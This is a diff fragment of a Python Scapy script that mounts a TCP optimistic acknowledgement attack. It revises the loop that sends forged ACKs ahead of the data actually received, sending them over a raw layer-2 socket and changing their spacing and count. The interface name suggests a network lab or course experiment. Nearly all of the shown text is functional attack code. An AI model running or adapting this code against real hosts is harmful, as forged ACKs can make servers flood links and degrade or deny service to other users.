@@ -28,14 +28,10 @@ if __name__ == "__main__":
     data = sr1(ack)
 
     print "First data packet arrived. Sending optimistic acks."
-    data.show()
-
+    s = conf.L2socket(iface='client-eth0') 
     OPT_ACK_START = data.seq + 1
-    ACK_SPACING = 1000
+    ACK_SPACING = 2000
     pkt_list = []
-    for i in range(100):
-        opt_ack = ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=(OPT_ACK_START + i * ACK_SPACING), seq=(SEQ + 1))
-        pkt_list.append(opt_ack)
-    
-    send(pkt_list)
-
+    for i in range(51):
+        opt_ack = Ether() / ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=(OPT_ACK_START + i * ACK_SPACING), seq=(SEQ + 1))
+        s.send(opt_ack)
